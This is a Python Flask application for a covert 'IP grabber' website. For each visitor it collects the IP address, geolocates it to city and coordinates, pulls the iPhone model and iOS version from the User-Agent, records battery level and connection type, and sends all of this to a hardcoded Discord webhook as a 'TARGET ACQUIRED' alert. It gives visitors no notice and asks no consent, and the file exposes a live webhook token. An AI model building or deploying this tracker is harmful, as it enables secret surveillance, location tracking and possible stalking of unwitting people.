from flask import Flask, render_template, request, jsonify
import requests
import json
import re
import os

app = Flask(__name__, template_folder='hehe')

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1527353925114794105/RoEyXsuW46terakrxr7dZzy-axy0f3fg-coZioe-ELUhQ6KTMPJFfoGaBC_E-fWakFH8"

def get_ip_info(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = r.json()
        return {
            "country": data.get("country", "Unknown"),
            "region": data.get("regionName", "Unknown"),
            "city": data.get("city", "Unknown"),
            "zip": data.get("zip", "Unknown"),
            "lat": data.get("lat", 0),
            "lon": data.get("lon", 0),
            "isp": data.get("isp", "Unknown"),
            "org": data.get("org", "Unknown"),
            "as": data.get("as", "Unknown")
        }
    except:
        return {"country": "Unknown", "region": "Unknown", "city": "Unknown", "zip": "Unknown", "lat": 0, "lon": 0, "isp": "Unknown", "org": "Unknown", "as": "Unknown"}

def send_to_discord(payload):
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
    except:
        pass

@app.route('/')
def index():
    return render_template('site.html')

@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.get_json() or {}
    
    # Get real IP even behind proxies
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    
    ip_info = get_ip_info(ip)
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Extract iPhone model and iOS version from User-Agent
    iphone_model = "Unknown"
    ios_version = "Unknown"
    
    if 'iPhone' in user_agent:
        # Try to extract model from User-Agent (e.g., iPhone14,2)
        model_match = re.search(r'iPhone\d+,\d+', user_agent)
        if model_match:
            model_code = model_match.group()
            iphone_model = map_iphone_model(model_code)
        else:
            iphone_model = "iPhone (Model Unknown)"
        
        # Extract iOS version
        os_match = re.search(r'OS (\d+_\d+(?:_\d+)?)', user_agent)
        if os_match:
            ios_version = os_match.group(1).replace('_', '.')
        else:
            ios_version = "Unknown"
    
    connection_type = data.get('connectionType', 'Unknown')
    battery_level = data.get('batteryLevel', 'Unknown')
    
    # Build Discord embed
    embed = {
        "title": "🎯 New Target Captured",
        "color": 16711680,
        "fields": [
            {"name": "IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "iPhone Model", "value": f"`{iphone_model}`", "inline": True},
            {"name": "iOS Version", "value": f"`{ios_version}`", "inline": True},
            {"name": "Battery Level", "value": f"`{battery_level}%`", "inline": True},
            {"name": "Connection Type", "value": f"`{connection_type}`", "inline": True},
            {"name": "Country", "value": f"`{ip_info['country']}`", "inline": True},
            {"name": "Region", "value": f"`{ip_info['region']}`", "inline": True},
            {"name": "City", "value": f"`{ip_info['city']}`", "inline": True},
            {"name": "ISP", "value": f"`{ip_info['isp']}`", "inline": True},
            {"name": "Latitude", "value": f"`{ip_info['lat']}`", "inline": True},
            {"name": "Longitude", "value": f"`{ip_info['lon']}`", "inline": True},
            {"name": "User Agent", "value": f"```{user_agent[:1000]}```", "inline": False}
        ],
        "footer": {"text": "Ghaithollah Intel • Each visitor is isolated and logged individually"},
        "timestamp": request.headers.get('Date', 'Now')
    }
    
    payload = {
        "content": "@everyone 🚨 **TARGET ACQUIRED** 🚨",
        "embeds": [embed]
    }
    
    send_to_discord(payload)
    
    return jsonify({
        "ip": ip,
        "iphoneModel": iphone_model,
        "iosVersion": ios_version,
        "batteryLevel": battery_level,
        "connectionType": connection_type,
        "location": f"{ip_info['city']}, {ip_info['region']}, {ip_info['country']}"
    })

def map_iphone_model(code):
    models = {
        "iPhone1,1": "iPhone 2G", "iPhone1,2": "iPhone 3G", "iPhone2,1": "iPhone 3GS",
        "iPhone3,1": "iPhone 4", "iPhone3,2": "iPhone 4", "iPhone3,3": "iPhone 4",
        "iPhone4,1": "iPhone 4S", "iPhone5,1": "iPhone 5", "iPhone5,2": "iPhone 5",
        "iPhone5,3": "iPhone 5c", "iPhone5,4": "iPhone 5c", "iPhone6,1": "iPhone 5s",
        "iPhone6,2": "iPhone 5s", "iPhone7,1": "iPhone 6 Plus", "iPhone7,2": "iPhone 6",
        "iPhone8,1": "iPhone 6s", "iPhone8,2": "iPhone 6s Plus", "iPhone8,4": "iPhone SE (1st gen)",
        "iPhone9,1": "iPhone 7", "iPhone9,2": "iPhone 7 Plus", "iPhone9,3": "iPhone 7",
        "iPhone9,4": "iPhone 7 Plus", "iPhone10,1": "iPhone 8", "iPhone10,2": "iPhone 8 Plus",
        "iPhone10,3": "iPhone X", "iPhone10,4": "iPhone 8", "iPhone10,5": "iPhone 8 Plus",
        "iPhone10,6": "iPhone X", "iPhone11,2": "iPhone XS", "iPhone11,4": "iPhone XS Max",
        "iPhone11,6": "iPhone XS Max", "iPhone11,8": "iPhone XR", "iPhone12,1": "iPhone 11",
        "iPhone12,3": "iPhone 11 Pro", "iPhone12,5": "iPhone 11 Pro Max", "iPhone12,8": "iPhone SE (2nd gen)",
        "iPhone13,1": "iPhone 12 mini", "iPhone13,2": "iPhone 12", "iPhone13,3": "iPhone 12 Pro",
        "iPhone13,4": "iPhone 12 Pro Max", "iPhone14,2": "iPhone 13 Pro", "iPhone14,3": "iPhone 13 Pro Max",
        "iPhone14,4": "iPhone 13 mini", "iPhone14,5": "iPhone 13", "iPhone14,6": "iPhone SE (3rd gen)",
        "iPhone14,7": "iPhone 14", "iPhone14,8": "iPhone 14 Plus", "iPhone15,2": "iPhone 14 Pro",
        "iPhone15,3": "iPhone 14 Pro Max", "iPhone15,4": "iPhone 15", "iPhone15,5": "iPhone 15 Plus",
        "iPhone16,1": "iPhone 15 Pro", "iPhone16,2": "iPhone 15 Pro Max", "iPhone17,1": "iPhone 16 Pro",
        "iPhone17,2": "iPhone 16 Pro Max", "iPhone17,3": "iPhone 16", "iPhone17,4": "iPhone 16 Plus"
    }
    return models.get(code, code)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
